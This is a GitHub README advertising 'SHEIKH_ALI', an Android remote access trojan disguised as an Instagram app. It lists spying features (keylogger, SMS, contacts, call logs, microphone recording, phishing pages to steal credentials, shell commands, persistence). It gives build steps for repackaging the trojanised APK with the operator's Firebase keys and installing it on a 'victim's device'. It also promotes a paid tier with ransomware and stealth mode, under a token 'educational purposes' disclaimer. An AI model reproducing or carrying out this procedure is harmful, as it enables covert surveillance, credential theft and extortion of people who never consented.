
<p align="center">
<img src='WEB PANEL/img/logo.png' style="height:100px;width:100px;" >
</p>
<h1 align=center>𝐒𝐇𝐄𝐈𝐊𝐇_𝐀𝐋𝐈</h1>

#### A multifunctional Android RAT with GUI based Web Panel without port forwarding.

<div align="center">

[![https://telegram.me/Sheikh_ali_ahmad_24](https://img.shields.io/badge/ᴡʜᴀᴛsᴀᴘᴘ-ᴄᴏɴᴛᴀᴄᴛ-green.svg?style=flat-square)](https://wa.me/+923143702270?text=*ʜɪɪ+𓄂𝑺𝑯𝑬𝑰𝑲𝑯-𝑨𝑳𝑰🔥༽༼--+ɪ+ɴᴇᴇᴅ+ʜᴇʟᴘ!.+ɪ+ᴍᴇssᴀɢᴇᴅ+ʏᴏᴜ+ғʀᴏᴍ+ꜱʜᴇɪᴋʜ-ᴀʟɪ-ᴍᴅ+ʀᴇᴘᴏ!!*)
[![https://telegram.me/Sheikh_ali_ahmad_24](https://img.shields.io/badge/ᴛᴇʟᴇɢʀᴀᴍ-ᴄᴏɴᴛᴀᴄᴛ-blue.svg?style=flat-square)](https://telegram.me/Sheikh_ali_ahmad_24)

</div>

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio through Mic
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Pre Binded with [Instagram Webview Phishing ](https://github.com/Sheikh-ali-2412/PI)
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed

<img align=center src=.github/img.jpg >


## Requirements
 - Firebase Account
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)


## How to Build 
  ### Firebase Setup
 1. Create an Firebase Account and afterwords create a new project with any name.
 1. Enable Firebase Database and Firebase Storage.
 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
    - ```js
          {
           "rules": {
                   ".read": "true",
                   ".write": "true"
                    }
          }
      ```
 1. In Firebase Storage allow reads and writes for all paths.
    - ```js
        rules_version = '2';
        service firebase.storage {
        match /b/{bucket}/o {
            match /{allPaths=**} {
               allow read, write 
              }
          }
       }
      ```
 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
 1. Also create a web app and copy the config of webapp.
   ### Panel Setup
 1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Sheikh_sli_2412/SHEIKH_ALI/blob/302dca641bb04c6bed72d1b2cebdfc79ccfbb046/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
 1. Save the file , Your Panel Setup is completed.
 ### Android RAT
 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
 1. Decompile it using any Decompiler recommend above.
 1. Now open `res/values/strings.xml` file.
 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
    - Example 
       ```xml 
       <string name="firebase_database_url">https://your_database_url.firebase.com</string>
       <string name="google_api_key">your_api_key</string>
       <string name="google_app_id">your_app_id</string>
       <string name="google_storage_bucket">your_storage_bucket_url</string>
       <string name="project_id">project_id</string>
       ```
 1. Now compile the code with appt2.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
  
  ### Tutorial Videos
  1. [![https://telegram.me/Sheikh_ali_ahmad_24](https://img.shields.io/badge/ᴡʜᴀᴛsᴀᴘᴘ-green.svg?style=flat-square)](https://whatsapp.com/channel/0029Vao1lnR1nozDF8jBNh3B)

### ❤️Supporters❤️
[![Stargazers repo roster for @Sheikh-ali-2412/SHEIKH_ALI](https://reporoster.com/stars/dark/Sheikh_sli_2412/SHEIKH_ALI)](https://github.com/Sheikh_sli_2412/SHEIKH_ALI/stargazers)

[![Forkers repo roster for @Sheikh-ali-2412/SHEIKH_ALI](https://reporoster.com/forks/dark/Sheikh_sli_2412/SHEIKH_ALI)](https://github.com/Sheikh_sli_2412/SHEIKH_ALI/network/members)

## SHEIKH_ALI PRO <img src='WEB PANEL/img/logo.png' style="height:30px;width:30px;" >
 1. Read , Delete files from victim's device
 1. Encrypt any file in victim's device
 1. Lock Victims Device with 4 digit Pin Code
 1. Capture Photo from Front and Back Camera
 1. Capture Screenshot from background 
 1. Automatically Record Incoming and Outgoing Calls
 1. Get Sim Card Information
 1. Ransomware (encrypt all the files and show the notification demanding for ransom)
 1. Auto Start Permission for all chinese vendors.
 1. Hidden App without Foreground service notification (full stealth mode)
<img align=center src=./.github/jpg.jpg >

 ### PoC Video
  1. https://t.me/Sheikh_ali_ahmad_24


## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>


The use of the SHEIKH_ALI is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).








